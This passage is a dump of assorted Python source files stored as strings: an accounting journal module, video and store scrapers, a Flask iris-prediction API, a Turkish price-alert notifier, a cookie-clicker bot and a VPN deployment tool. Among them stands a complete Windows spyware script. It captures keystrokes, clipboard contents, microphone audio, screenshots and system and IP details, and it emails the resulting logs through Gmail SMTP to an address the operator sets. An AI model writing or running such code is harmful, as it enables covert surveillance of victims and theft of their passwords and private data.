region_name=region_name)\n\n    # \u6700\u65b0\u306e\u30ed\u30b0\u30b9\u30c8\u30ea\u30fc\u30e0\u3092\u53d6\u5f97\n    response = client_logs.describe_log_streams(\n        ",
    "\"\"\"Module for accounting journal and entries.\"\"\"\n\nimport datetime\nfrom abc import ABC, abstractmethod\nfrom collections.abc import Iterator\nfrom dataclasses import dataclass, field\n\nfrom tabulate import tabulate\n\nfrom brms.accounting.account import TAccount\n\n\nclass JournalEntry(ABC):\n    \"\"\"Abstract base class for a journal entry.\"\"\"\n\n    debit_accounts: dict[TAccount, float]\n    credit_accounts: dict[TAccount, float]\n    date: datetime.date | None\n    description: str\n\n    @abstractmethod\n    def involves_account(self, account: TAccount) -> bool:\n        \"\"\"Check if the journal entry involves a specific account.\"\"\"\n\n    def debit_account_value_pairs(self) -> Iterator[tuple[TAccount, float]]:\n        \"\"\"Return an iterator over debit account and value pairs.\"\"\"\n        yield from self.debit_accounts.items()\n\n    def credit_account_value_pairs(self) -> Iterator[tuple[TAccount, float]]:\n        \"\"\"Return an iterator over credit account and value pairs.\"\"\"\n        yield from self.credit_accounts.items()\n\n\n@dataclass\nclass SimpleEntry(JournalEntry):\n    \"\"\"Represent a simple journal entry with debit and credit accounts and a value.\"\"\"\n\n    debit_account: TAccount\n    credit_account: TAccount\n    value: float\n    date: datetime.date | None = None\n    description: str = \"\"\n\n    def __post_init__(self) -> None:\n        \"\"\"Post-initialization processing to conform the protocol.\"\"\"\n        self.debit_accounts: dict[TAccount, float] = {self.debit_account: self.value}\n        self.credit_accounts: dict[TAccount, float] = {self.credit_account: self.value}\n\n    def involves_account(self, account: TAccount) -> bool:\n        \"\"\"Check if the journal entry involves a specific account.\"\"\"\n        return account in {self.debit_account, self.credit_account}\n\n    def to_html(self) -> str:\n        \"\"\"Return a string representation of the simple journal entry.\"\"\"\n        data = [\n            [\"Dr.\", self.debit_account.name, self.value],\n            [\"Cr.\", self.credit_account.name, self.value],\n        ]\n        return tabulate(data, tablefmt=\"html\", numalign=\"right\", floatfmt=\".2f\", maxcolwidths=[None, 50])\n\n\n@dataclass\nclass CompoundEntry(JournalEntry):\n    \"\"\"Represent a compound journal entry that can affect multiple accounts.\"\"\"\n\n    debit_accounts: dict[TAccount, float]\n    credit_accounts: dict[TAccount, float]\n    date: datetime.date | None = None\n    description: str = \"\"\n\n    def __post_init__(self) -> None:\n        \"\"\"Post-initialization processing to validate the compound journal entry.\"\"\"\n        self.validate()\n\n    def validate(self) -> None:\n        \"\"\"Assert sum of debit entries equals sum of credit entries.\"\"\"\n        if not self.is_balanced():\n            error_message = \"Compound journal entry is not balanced\"\n            raise ValueError(error_message)\n\n    def total_debits(self) -> float:\n        \"\"\"Calculate the total debits for the compound entry.\"\"\"\n        return sum(self.debit_accounts.values())\n\n    def total_credits(self) -> float:\n        \"\"\"Calculate the total credits for the compound entry.\"\"\"\n        return sum(self.credit_accounts.values())\n\n    def is_balanced(self) -> bool:\n        \"\"\"Check if the compound entry is balanced.\n\n        Using 1e-6 as a tolerance level to account for floating-point inaccuracies.\n        \"\"\"\n        return abs(self.total_debits() - self.total_credits()) < 1e-6\n\n    def involves_account(self, account: TAccount) -> bool:\n        \"\"\"Check if the journal entry involves a specific account.\"\"\"\n        return account in self.debit_accounts or account in self.credit_accounts\n\n    def to_html(self) -> str:\n        \"\"\"Return a string representation of the simple journal entry.\"\"\"\n        data = []\n        for account, value in self.debit_accounts.items():\n            data.append([\"Dr.\", account.name, value])\n        for account, value in self.credit_accounts.items():\n            data.append([\"Cr.\", account.name, value])\n        return tabulate(data, tablefmt=\"html\", numalign=\"right\", floatfmt=\".2f\", maxcolwidths=[None, 50])\n\n\n@dataclass\nclass Journal:\n    \"\"\"Class to record all journal entries.\"\"\"\n\n    entries: list[JournalEntry] = field(default_factory=list)\n\n    def add_entry(self, entry: JournalEntry) -> None:\n        \"\"\"Add a journal entry to the journal.\"\"\"\n        self.entries.append(entry)\n\n    def get_entries_by_date(self, date: datetime.date) -> list[JournalEntry]:\n        \"\"\"Get all journal entries for a specific date.\"\"\"\n        return [entry for entry in self.entries if entry.date == date]\n\n    def get_entries_by_account(self, account: TAccount) -> list[JournalEntry]:\n        \"\"\"Get all journal entries involving a specific account.\"\"\"\n        return [entry for entry in self.entries if entry.involves_account(account)]\n\n    def get_entries_by_description(self, description: str) -> list[JournalEntry]:\n        \"\"\"Get all journal entries matching a specific description.\"\"\"\n        return [entry for entry in self.entries if description in entry.description]\n\n    def get_e",
    "from selenium import webdriver\r\nfrom selenium.webdriver.chrome.options import Options\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nfrom selenium.webdriver.support.wait import WebDriverWait\r\nfrom selenium.webdriver.common.by import By\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\nimport os\r\nimport csv\r\nimport requests\r\nfrom tqdm import tqdm\r\nfrom urllib.parse import urlparse\r\nfrom concurrent.futures import ThreadPoolExecutor\r\nimport threading\r\nimport time\r\n\r\n# C\u00e1c bi\u1ebfn global\r\nBASE_URL = \"https://qipedc.moet.gov.vn\"\r\nVIDEOS_API = \"https://qipedc.moet.gov.vn/videos\"\r\noutput_dir = \"Dataset/Video\"\r\ntext_dir = \"Dataset/Text\"\r\nos.makedirs(output_dir, exist_ok=True)  \r\nos.makedirs(text_dir, exist_ok=True)\r\ncsv_path = os.path.join(text_dir, \"Label.csv\")\r\ncsv_lock = threading.Lock()\r\n\r\ndef handle_recursive_scrapping(dict: dict, driver):\r\n    vids = WebDriverWait(driver=driver, timeout=3).until(\r\n        EC.presence_of_element_located((By.CSS_SELECTOR, \"section:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(1)\"))\r\n    )\r\n    vids = driver.find_elements(By.CSS_SELECTOR, \"section:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(1) a\")\r\n    for vid in vids:\r\n        gross = vid.find_element(By.CSS_SELECTOR, \"p\").text\r\n        raw_thumb_url = vid.find_element(By.CSS_SELECTOR, \"img\").get_attribute(\"src\")\r\n        base_thumbs_url = \"https://qipedc.moet.gov.vn/thumbs/\"\r\n        videosID = raw_thumb_url[len(base_thumbs_url):len(raw_thumb_url) - 4]\r\n        video_url = BASE_URL + \"/videos/\" + videosID + \".mp4\"\r\n\r\n        item = {\r\n            \"gross\": gross,\r\n            \"url\": video_url\r\n        }\r\n        print(f\"\u2713 T\u00ecm th\u1ea5y: {gross}\")\r\n        dict.append(item)\r\n    return\r\n\r\ndef init_csv():\r\n    if not os.path.exists(csv_path):\r\n        with open(csv_path, 'w', newline='', encoding='utf-8') as f:\r\n            writer = csv.writer(f)\r\n            writer.writerow([\"STT\", \"VIDEO\", \"TEXT\"])\r\n\r\ndef add_to_csv(stt, video_name, text):\r\n    with csv_lock:\r\n        with open(csv_path, 'a', newline='', encoding='utf-8') as f:\r\n            writer = csv.writer(f)\r\n            writer.writerow([stt, video_name, text])\r\n\r\ndef download_video(video_data):\r\n    url = video_data.get(\"url\")\r\n    gross = video_data.get(\"gross\")  # L\u1ea5y gross t\u1eeb data crawl \u0111\u01b0\u1ee3c\r\n    if not url:\r\n        return\r\n\r\n    filename = os.path.basename(urlparse(url).path)\r\n    output_path = os.path.join(output_dir, filename)\r\n\r\n    if os.path.exists(output_path):\r\n        print(f\"\u23ed\ufe0f  B\u1ecf qua: {filename} - \u0111\u00e3 t\u1ed3n t\u1ea1i\")\r\n        return\r\n        \r\n    try:\r\n        print(f\"\\n\u2b07\ufe0f  \u0110ang t\u1ea3i: {filename}\")\r\n        response = requests.get(url, stream=True)\r\n        response.raise_for_status()\r\n        \r\n        total_size = int(response.headers.get('content-length', 0))\r\n        \r\n        with open(output_path, 'wb') as f, tqdm(\r\n            desc=f\"Ti\u1ebfn tr\u00ecnh t\u1ea3i {filename}\",\r\n            total=total_size,\r\n            unit='B', \r\n            unit_scale=True,\r\n            unit_divisor=1024,\r\n            ncols=100\r\n        ) as pbar:\r\n            for chunk in response.iter_content(chunk_size=8192):\r\n                size = f.write(chunk)\r\n                pbar.update(size)\r\n        \r\n        stt = sum(1 for _ in open(csv_path, encoding='utf-8'))\r\n        add_to_csv(stt, filename, gross)  # S\u1eed d\u1ee5ng gross thay v\u00ec f\"Video {filename}\"\r\n                \r\n        print(f\"\u2705 Ho\u00e0n th\u00e0nh: {filename}\")\r\n        print(f\"\ud83d\udcdd \u0110\u00e3 c\u1eadp nh\u1eadt Label.csv v\u1edbi nh\u00e3n: {gross}\")\r\n        \r\n    except Exception as e:\r\n        print(f\"\u274c L\u1ed7i khi t\u1ea3i {filename}: {str(e)}\")\r\n        if os.path.exists(output_path):\r\n            os.remove(output_path)\r\n\r\ndef crawl_videos():\r\n    print(\"\\n=== \ud83d\udd0d B\u1eaeT \u0110\u1ea6U CRAWL D\u1eee LI\u1ec6U ===\")\r\n    options = Options()\r\n    options.add_argument('--disable-dev-shm-usage')\r\n    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)\r\n    videos = []\r\n    \r\n    try:\r\n        driver.get(\"https://qipedc.moet.gov.vn/dictionary\")\r\n        print(\"\ud83c\udf10 \u0110\u00e3 k\u1ebft n\u1ed1i t\u1edbi trang t\u1eeb \u0111i\u1ec3n\")\r\n        \r\n        handle_recursive_scrapping(videos, driver)\r\n\r\n        for i in range(2, 5):\r\n            id = i\r\n            if i != 2: id = i + 1\r\n            button = driver.find_element(By.CSS_SELECTOR, f\"button:nth-of-type({id})\")\r\n            button.click()\r\n            handle_recursive_scrapping(videos, driver)\r\n            \r\n        for i in range(5, 218):\r\n            id = 6\r\n            button = driver.find_element(By.CSS_SELECTOR, f\"button:nth-of-type({id})\")\r\n            button.click()\r\n            handle_recursive_scrapping(videos, driver)\r\n\r\n        for i in range(218, 220):\r\n            id = 6\r\n            if i != 218: id = 7\r\n            button = driver.find_element(By.CSS_SELECTOR, f\"button:nth-of-type({id})\")\r\n            button.click()\r\n            handle_recursive_scrapping(videos, driver)\r\n\r\n    except Exception as e:\r\n        print(f\"\u274c L\u1ed7i khi crawl: {e}\")\r\n    fi",
    "from flask import Flask, request, jsonify\nimport joblib, warnings, os, requests\nimport pandas as pd\nimport numpy as np\nfrom typing import Dict, Any, Union\nwarnings.filterwarnings('ignore')\n\napp = Flask(__name__)\n\n# load credential\nVALIDATE_TOKEN = os.getenv('VALIDATE_TOKEN')\n\n@app.route('/v1/predict/realtime/<sepal_length>/<sepal_width>/<petal_length>/<petal_width>', methods=[\"POST\"])\ndef realtime(sepal_length: float, sepal_width: float, petal_length: float, petal_width: float) -> Dict[str, Any]:\n  \"\"\"\n  Predict irish with custom input data\n  \"\"\"\n  # get token\n  access_token = request.headers.get('Authorization')\n  \n  # validate access token\n  response_validation = requests.get(f\"{VALIDATE_TOKEN}{access_token}\")\n  token_is_valid = response_validation.json().get(\"token_valid\")\n\n  if token_is_valid:\n\n    # load saved pipeline object\n    try:\n      pipeline = joblib.load('pipeline.bin')\n    except FileNotFoundError:\n      return jsonify({'Error': 'Saved pipeline not found.'}), 404\n    except joblib.exc.JoblibException as e:\n      return jsonify({'Error': f'Error loading pipeline: {e}'}), 500\n\n    # processing input data\n    input_dict = {\n      'sepal_length': [float(sepal_length)], \n      'sepal_width': [float(sepal_width)], \n      'petal_length': [float(petal_length)], \n      'petal_width': [float(petal_width)]\n    }\n    data_input = pd.DataFrame(input_dict)\n    scaled_data_input = preprocessing(pipeline, data_input) #pipeline['scaler'].transform(data_input)\n    result_dict = predict(pipeline, scaled_data_input) # scaled_data_input)\n\n    return jsonify(raw_data=input_dict, \\\n                  preprocessed_data=dict(enumerate(scaled_data_input.flatten(), 1)), \\\n                  result=result_dict) \n  \n  else:\n     return jsonify({'message': 'Invalid or expired access token'}), 401\n  \n@app.route('/v1/predict/by_index/<index>', methods=['POST'])\ndef predict_by_index(index: int) -> Dict[str, Any]:\n  \"\"\"\n  Gets existing data from a remote server (the UCI Machine Learning Repository)\n  and loads it into a pandas DataFrame.\n  \"\"\"\n  # get token\n  access_token = request.headers.get('Authorization')\n  \n  # validate access token\n  response_validation = requests.get(f\"{VALIDATE_TOKEN}{access_token}\")\n  token_is_valid = response_validation.json().get(\"token_valid\")\n\n  if token_is_valid:\n    # load saved pipeline object\n    try:\n      pipeline = joblib.load('pipeline.bin')\n    except FileNotFoundError:\n      return jsonify({'Error': 'Saved pipeline not found.'}), 404\n    except joblib.exc.JoblibException as e:\n      return jsonify({'Error': f'Error loading pipeline: {e}'}), 500\n\n    # getting data\n    try:\n      col_names = ['sepal_length', 'sepal_width', 'petal_length', 'petal_width', 'class']\n      data = pd.read_csv('https://archive.ics.uci.edu/ml/machine-learning-databases/iris/iris.data', \n                          names=col_names)\n      data = data.loc[[int(index)]]\n      input_data = data.drop(columns='class')\n    except ConnectionError:\n      return jsonify({'Error': 'Could not connect to server.'}), 404\n    except ValueError:\n      return jsonify({'Error': 'Could not load data into DataFrame.'}), 500\n    except Exception as e:\n      return jsonify({'Error': f'{e}'}), 404\n    \n    scaled_data_input = preprocessing(pipeline, input_data) #pipeline['scaler'].transform(input_data)\n    result_dict = predict(pipeline, scaled_data_input)\n    input_data = input_data[col_names[:-1]]\n    return jsonify(raw_data=input_data.to_dict(), \\\n                  preprocessed_data=dict(enumerate(scaled_data_input.flatten(), 1)), \\\n                  actual=data[['class']].to_dict(), \\\n                  result=result_dict) \n  else:\n     return jsonify({'message': 'Invalid or expired access token'}), 401\n\ndef preprocessing(pipeline: Dict[str, object], data_input: np.ndarray) -> pd.DataFrame:\n  \"\"\"\n  Preprocessing input data\n  \"\"\"\n  # feature engineering input data\n  data_input['sepal_area'] = data_input[pipeline['feature_engineering']['sepal_area']].prod(axis=1) \n  data_input['petal_area'] = data_input[pipeline['feature_engineering']['petal_area']].prod(axis=1)\n  data_input = data_input[data_input.columns[-2:]]\n\n  # scaling data\n  scaled_data_input = pipeline['scaler'].transform(data_input)\n\n  return scaled_data_input\n  \ndef predict(pipeline: Dict[str, object], scaled_data_input: np.ndarray) -> Dict[str, Union[str, float]]:\n  \"\"\"\n  Predict the class and its probability for each model in the given pipeline\n  \"\"\"\n  # predict\n  results = {}\n  for model_name, model in pipeline.items():\n    if not model_name.startswith('model_'):\n      continue\n    prediction = model.predict(scaled_data_input)\n    probas = np.max(model.predict_proba(scaled_data_input)[0])*100\n    encoder = pipeline['label_encoder']\n    results[f\"{type(model).__name__}'s Prediction\"] = f'{probas:.2f}% is {encoder.inverse_transform([prediction])[0]}'\n  return results\n\nif __name__ == '__main__':\n  app.run(debug=True, port=5002)",
    "from email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom email.mime.base import MIMEBase\nfrom email import encoders\nimport smtplib\nimport socket\nimport platform\nimport win32clipboard\nfrom pynput.keyboard import Key, Listener\nimport time\nimport os\nfrom scipy.io.wavfile import write\nimport sounddevice as sd\nfrom cryptography.fernet import Fernet\nimport getpass\nfrom requests import get\nfrom multiprocessing import Process, freeze_support\nfrom PIL import ImageGrab\n\nkeys_information = \"key_log.txt\"\nsystem_information = \"syseminfo.txt\"\nclipboard_information = \"clipboard.txt\"\naudio_information = \"audio.wav\"\nscreenshot_information = \"screenshot.png\"\n\nkeys_information_e = \"e_key_log.txt\"\nsystem_information_e = \"e_systeminfo.txt\"\nclipboard_information_e = \"e_clipboard.txt\"\n\nmicrophone_time = 10\ntime_iteration = 15\nnumber_of_iterations_end = 3\n\nemail_address = \" \" # Enter disposable email here\npassword = \" \" # Enter email password here\n\nusername = getpass.getuser()\n\ntoaddr = \" \" # Enter the email address you want to send your information to\n\nkey = \" \" # Generate an encryption key from the Cryptography folder\n\nfile_path = \" \" # Enter the file path you want your files to be saved to\nextend = \"\\\\\"\nfile_merge = file_path + extend\n\n\ndef send_email(filename, attachment, toaddr):\n    fromaddr = email_address\n    msg = MIMEMultipart()\n    msg['From'] = fromaddr\n    msg['To'] = toaddr\n    msg['Subject'] = \"Log File\"\n    body = \"Body_of_the_mail\"\n    msg.attach(MIMEText(body, 'plain'))\n    filename = filename\n    attachment = open(attachment, 'rb')\n    p = MIMEBase('application', 'octet-stream')\n    p.set_payload((attachment).read())\n    encoders.encode_base64(p)\n    p.add_header('Content-Disposition', \"attachment; filename= %s\" % filename)\n    msg.attach(p)\n    s = smtplib.SMTP('smtp.gmail.com', 587)\n    s.starttls()\n    s.login(fromaddr, password)\n    text = msg.as_string()\n    s.sendmail(fromaddr, toaddr, text)\n    s.quit()\nsend_email(keys_information, file_path + extend + keys_information, toaddr)\n\ndef computer_information():\n    with open(file_path + extend + system_information, \"a\") as f:\n        hostname = socket.gethostname()\n        IPAddr = socket.gethostbyname(hostname)\n        try:\n            public_ip = get(\"https://api.ipify.org\").text\n            f.write(\"Public IP Address: \" + public_ip)\n\n        except Exception:\n            f.write(\"Couldn't get Public IP Address (most likely max query\")\n\n        f.write(\"Processor: \" + (platform.processor()) + '\\n')\n        f.write(\"System: \" + platform.system() + \" \" + platform.version() + '\\n')\n        f.write(\"Machine: \" + platform.machine() + \"\\n\")\n        f.write(\"Hostname: \" + hostname + \"\\n\")\n        f.write(\"Private IP Address: \" + IPAddr + \"\\n\")\n\ncomputer_information()\n\n\ndef copy_clipboard():\n    with open(file_path + extend + clipboard_information, \"a\") as f:\n        try:\n            win32clipboard.OpenClipboard()\n            pasted_data = win32clipboard.GetClipboardData()\n            win32clipboard.CloseClipboard()\n\n            f.write(\"Clipboard Data: \\n\" + pasted_data)\n\n        except:\n            f.write(\"Clipboard could be not be copied\")\n\ncopy_clipboard()\n\ndef microphone():\n    fs = 44100\n    seconds = microphone_time\n    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)\n    sd.wait()\n    write(file_path + extend + audio_information, fs, myrecording)\n\n\ndef screenshot():\n    im = ImageGrab.grab()\n    im.save(file_path + extend + screenshot_information)\n\nscreenshot()\n\nnumber_of_iterations = 0\ncurrentTime = time.time()\nstoppingTime = time.time() + time_iteration\n\ndef should_stop_keylogger():\n    return time.time() > start_time + duration\n\n# Set duration in seconds (e.g., 2 hours = 7200 seconds)\nduration = 7200  # Change this value to set the desired duration\nstart_time = time.time()\n\nwhile number_of_iterations < number_of_iterations_end:\n\n    count = 0\n    keys =[]\n\n    def on_press(key):\n        global keys, count, currentTime\n        print(key)\n        keys.append(key)\n        count += 1\n        currentTime = time.time()\n\n        if count >= 1:\n            count = 0\n            write_file(keys)\n            keys =[]\n\n    def write_file(keys):\n        with open(file_path + extend + keys_information, \"a\") as f:\n            for key in keys:\n                k = str(key).replace(\"'\", \"\")\n                if k.find(\"space\") > 0:\n                    f.write('\\n')\n                    f.close()\n                elif k.find(\"Key\") == -1:\n                    f.write(k)\n                    f.close()\n\n    def on_release(key):\n        if key == Key.esc:\n            return False\n        if should_stop_keylogger():\n            return False\n\n    with Listener(on_press=on_press, on_release=on_release) as listener:\n        listener.join()\n\n    if should_stop_keylogger():\n        break\n\n    if currentTime > stoppingTime:\n\n        with open(file_path + extend + keys_information, \"w\") as f:\n            f.write(\" \")\n\n        screenshot()\n",
    "\"\"\"\nBildirim Y\u00f6netim Mod\u00fcl\u00fc\n\nBu mod\u00fcl, Windows 10 masa\u00fcst\u00fc bildirimlerini y\u00f6netir.\nFiyat d\u00fc\u015f\u00fc\u015flerinde kullan\u0131c\u0131ya bildirim g\u00f6ndermek i\u00e7in kullan\u0131l\u0131r.\n\nS\u0131n\u0131flar:\n    - NotificationManager: Bildirim g\u00f6nderme i\u015flemlerini y\u00f6neten s\u0131n\u0131f\n\nYazar: G\u00fcrkay\nTarih: Ocak 2024\n\"\"\"\n\nfrom win10toast import ToastNotifier\nimport logging\nimport webbrowser\nimport threading\nimport time\n\nclass NotificationManager:\n    \"\"\"Windows 10 bildirimlerini y\u00f6neten s\u0131n\u0131f\"\"\"\n    \n    def __init__(self):\n        \"\"\"Toast bildirimi nesnesi olu\u015fturur\"\"\"\n        self.toaster = ToastNotifier()\n        \n    def send_price_alert(self, product_name, current_price, target_price, product_url):\n        \"\"\"\n        Fiyat d\u00fc\u015f\u00fc\u015f\u00fc durumunda bildirim g\u00f6nderir\n        \n        Args:\n            product_name: \u00dcr\u00fcn ad\u0131\n            current_price: Mevcut fiyat\n            target_price: Hedef fiyat\n            product_url: \u00dcr\u00fcn linki\n            \n        Not:\n            Bildirim 1 saat boyunca g\u00f6r\u00fcn\u00fcr kal\u0131r\n            Bildirime t\u0131kland\u0131\u011f\u0131nda \u00fcr\u00fcn sayfas\u0131 a\u00e7\u0131l\u0131r\n        \"\"\"\n        try:\n            # Bildirim mesaj\u0131n\u0131 haz\u0131rla\n            message = (\n                f\"{product_name}\\n\"\n                f\"Mevcut Fiyat: {current_price} TL\\n\"\n                f\"Hedef Fiyat: {target_price} TL\\n\"\n                f\"\u00dcr\u00fcne gitmek i\u00e7in t\u0131klay\u0131n!\"\n            )\n            \n            # Bildirimi g\u00f6ster (1 saat = 3600 saniye)\n            self.toaster.show_toast(\n                \"\ud83d\udd14 Fiyat D\u00fc\u015f\u00fc\u015f\u00fc Bildirimi!\",\n                message,\n                duration=3600,  # 1 saat boyunca g\u00f6ster\n                threaded=True,\n                icon_path=None  # Windows varsay\u0131lan bildirim ikonunu kullan\n            )\n            \n            # Bildirim g\u00f6sterildikten sonra taray\u0131c\u0131y\u0131 a\u00e7\n            def open_browser():\n                time.sleep(0.1)  # K\u0131sa bir s\u00fcre bekle\n                webbrowser.open(product_url)\n            \n            # Yeni bir thread'de taray\u0131c\u0131y\u0131 a\u00e7\n            threading.Thread(target=open_browser).start()\n            \n            logging.info(f\"Bildirim g\u00f6nderildi: {message}\")\n        except Exception as e:\n            logging.error(f\"Bildirim g\u00f6nderilirken hata olu\u015ftu: {str(e)}\") ",
    "import time\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\n\nchrome_options = webdriver.ChromeOptions()\nchrome_options.add_experimental_option(\"detach\", True)\n\ndriver = webdriver.Chrome(options=chrome_options)\ndriver.get(\"https://orteil.dashnet.org/experiments/cookie/\")\n\ncookie = driver.find_element(by=By.ID, value=\"cookie\")\n\nitems = driver.find_elements(by=By.CSS_SELECTOR, value=\"#store div\")\nitem_ids = [item.get_attribute(\"id\") for item in items]\n\ntimeout = time.time() + 5\nfive_min = time.time() + 60*5\n\nwhile True:\n    cookie.click()\n\n    if time.time() > timeout:\n        all_prices = driver.find_elements(by=By.CSS_SELECTOR, value=\"#store b\")\n        item_prices = []\n\n        for price in all_prices:\n            element_text = price.text\n            if element_text != \"\":\n                cost = int(element_text.split(\"-\")[1].strip().replace(\",\", \"\"))\n                item_prices.append(cost)\n\n        cookie_upgrades = {}\n        for n in range(len(item_prices)):\n            cookie_upgrades[item_prices[n]] = item_ids[n]\n\n        money_element = driver.find_element(by=By.ID, value=\"money\").text\n        if \",\" in money_element:\n            money_element = money_element.replace(\",\", \"\")\n        cookie_count = int(money_element)\n\n        affordable_upgrades = {}\n        for cost, id in cookie_upgrades.items():\n            if cookie_count > cost:\n                affordable_upgrades[cost] = id\n\n        highest_price_affordable_upgrade = max(affordable_upgrades)\n        print(highest_price_affordable_upgrade)\n        to_purchase_id = affordable_upgrades[highest_price_affordable_upgrade]\n\n        driver.find_element(by=By.ID, value=to_purchase_id).click()\n\n        timeout = time.time() + 5\n\n    if time.time() > five_min:\n        cookie_per_s = driver.find_element(by=By.ID, value=\"cps\").text\n        print(cookie_per_s)\n        break\n",
    "import os\nimport json\nimport shutil\nimport subprocess\n\nfrom builtins import input\n\nROOT_DIR = os.path.dirname(os.path.abspath(__file__))\nTERRAFORM_DIR = os.path.join(ROOT_DIR, 'terraform')\nANSIBLE_DIR = os.path.join(ROOT_DIR, 'ansible')\nSERVERS_DIR = os.path.join(ROOT_DIR, 'servers')\n\nCONFIG_FILE = 'config.json'\nOPEN_VPN_FILE = 'openvpn.yml'\nWIREGUARD_FILE = 'wireguard.yml'\n\nREGION_TO_CITY = {\n    # North America\n    \"us-east-1\": \"N. Virginia\",\n    \"us-east-2\": \"Ohio\",\n    \"us-west-1\": \"N. California\",\n    \"us-west-2\": \"Oregon\",\n    \"ca-central-1\": \"Canada (Central)\",\n    \"ca-west-1\": \"Canada West (Calgary)\",\n    # South America\n    \"sa-east-1\": \"S\u00e3o Paulo\",\n    # Europe\n    \"eu-west-1\": \"Ireland\",\n    \"eu-west-2\": \"London\",\n    \"eu-west-3\": \"Paris\",\n    \"eu-central-1\": \"Frankfurt\",\n    \"eu-north-1\": \"Stockholm\",\n    \"eu-south-1\": \"Milan\",\n    \"eu-south-2\": \"Spain\",\n    \"eu-central-2\": \"Zurich\",\n    # Middle East & Africa\n    \"me-south-1\": \"Bahrain\",\n    \"me-central-1\": \"UAE\",\n    # Asia Pacific\n    \"ap-southeast-1\": \"Singapore\",\n    \"ap-southeast-2\": \"Sydney\",\n    \"ap-southeast-3\": \"Jakarta\",\n    \"ap-southeast-4\": \"Melbourne\",\n    \"ap-southeast-5\": \"Malaysia\",\n    \"ap-northeast-1\": \"Tokyo\",\n    \"ap-northeast-2\": \"Seoul\",\n    \"ap-northeast-3\": \"Osaka\",\n    \"ap-south-1\": \"Mumbai\",\n    \"ap-south-2\": \"Hyderabad\",\n    \"ap-east-1\": \"Hong Kong\",\n    # China\n    \"cn-north-1\": \"Beijing\",\n    \"cn-northwest-1\": \"Ningxia\",\n}\n\n\ndef main():\n    print(\"Welcome to the Free VPN management tool!\")\n    print(\"You can choose one of the following actions:\")\n    print(\"  'deploy'  : Set up a new VPN server.\")\n    print(\"  'destroy' : Remove an existing VPN server.\")\n    print(\"  'list'    : View all active VPN servers.\")\n\n    action = pinput(\"Enter action\", \"deploy\", [\"deploy\", \"destroy\", \"list\"])\n\n    if action == \"deploy\":\n        print(\"Available AWS Regions:\")\n        region_selection(get_available_regions, deploy_vpn_resources)\n    elif action == \"destroy\":\n        print(\"Existing VPN servers:\")\n        region_selection(get_existing_regions, destroy_vpn_resources)\n    elif action == \"list\":\n        print(\"Existing VPN servers:\")\n        print_city_regions(get_existing_regions())\n    else:\n        print(f\"Invalid action '{action}'\")\n\n\ndef deploy_vpn_resources(region):\n    if region in get_existing_regions():\n        print(f\"VPN server for the {region} region already exists!\")\n        print(\"You will need to destroy the server before applying any changes!\")\n        return\n\n    var_file, vpn_server = vpn_parameters_selection(region)\n\n    subprocess.run(['terraform', '-chdir=' + TERRAFORM_DIR, 'workspace', 'select', '-or-create', region])\n    subprocess.run(['terraform', '-chdir=' + TERRAFORM_DIR, 'init', '-var-file=' + var_file])\n    subprocess.run(['terraform', '-chdir=' + TERRAFORM_DIR, 'plan', '-var-file=' + var_file])\n    result = subprocess.run(['terraform', '-chdir=' + TERRAFORM_DIR, 'apply', '-var-file=' + var_file, '-auto-approve'])\n\n    if result.returncode == 0:\n        ansible_configuration_update(region, vpn_server)\n\n\ndef destroy_vpn_resources(region):\n    print(f\"Destroying VPN server in region:'{region}'\")\n\n    var_file = os.path.join(SERVERS_DIR, region, CONFIG_FILE)\n\n    subprocess.run(['terraform', '-chdir=' + TERRAFORM_DIR, 'workspace', 'select', region])\n    result = subprocess.run(['terraform', '-chdir=' + TERRAFORM_DIR, 'destroy', '-var-file=' + var_file, '-auto-approve'])\n\n    if result.returncode == 0:\n        cleanup_after_server_destruction(region, var_file)\n\n\ndef ansible_configuration_update(region, vpn_server):\n    print(\"Configuring VPN server...\")\n\n    ansible = os.path.join(ANSIBLE_DIR, vpn_server)\n    config = '@' + os.path.join(SERVERS_DIR, region, CONFIG_FILE)\n\n    subprocess.run(['ansible-playbook', ansible, \"-i 'servers_group',\", '--extra-vars', config])\n\n\ndef cleanup_after_server_destruction(region, var_file):\n    print(f\"Deleting config files: {region}\")\n\n    delete_file(var_file)\n    delete_folder(os.path.join(SERVERS_DIR, region))\n\n    print(f\"Deleting workspace: {region}\")\n\n    subprocess.run(['terraform', '-chdir=' + TERRAFORM_DIR, 'workspace', 'select', 'default'])\n    subprocess.run(['terraform', '-chdir=' + TERRAFORM_DIR, 'workspace', 'delete', region])\n\n\ndef pinput(prompt, default=None, options=[]):\n    if default:\n        parameter = input(f\"{prompt} (default is '{default}'): \").lower() or default\n    else:\n        parameter = input(f\"{prompt}: \").lower()\n\n    if options and parameter not in options:\n        print(\"Invalid parameter, try again!\")\n        return pinput(prompt, default, options)\n\n    return parameter\n\n\ndef region_selection(get_regions, action):\n    regions = get_regions()\n\n    if not regions:\n        print(\"AWS regions are not available!\")\n        return\n\n    print_city_regions(regions)\n    action(pinput(\"Enter region name\", \"us-east-1\", regions))\n\n\ndef vpn_parameters_selection(region):\n    instance_name = pinput(\"Enter instance name\", \"vpn-server\")\n    instance_typ",
    "from selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.common.action_chains import ActionChains\nfrom time import sleep\nimport os\nfrom dotenv import load_dotenv\nimport mysql.connector\nload_dotenv()\n\n\ndef connect_to_db():\n    return mysql.connector.connect(\n        host=os.getenv(\"DB_HOST\"),\n        user=os.getenv(\"DB_USER\"),\n        password=os.getenv(\"DB_PASSWORD\"),\n        database=os.getenv(\"DB_NAME\")\n    )\n\ndef save_store_to_db(store_link, store_name, category, address, phone_num, business_hours):\n    db = connect_to_db()\n    cursor = db.cursor()\n    try:\n        sql = \"\"\"\n        INSERT INTO stores (store_link, store_name, category, address, phone_num, business_hours)\n        VALUES (%s, %s, %s, %s, %s, %s)\n        \"\"\"\n        cursor.execute(sql, (store_link, store_name, category, address, phone_num, business_hours))\n        store_id = cursor.lastrowid\n        db.commit()\n        print(\"DB \uc800\uc7a5 \uc131\uacf5:\", (store_link, store_name, category, address, 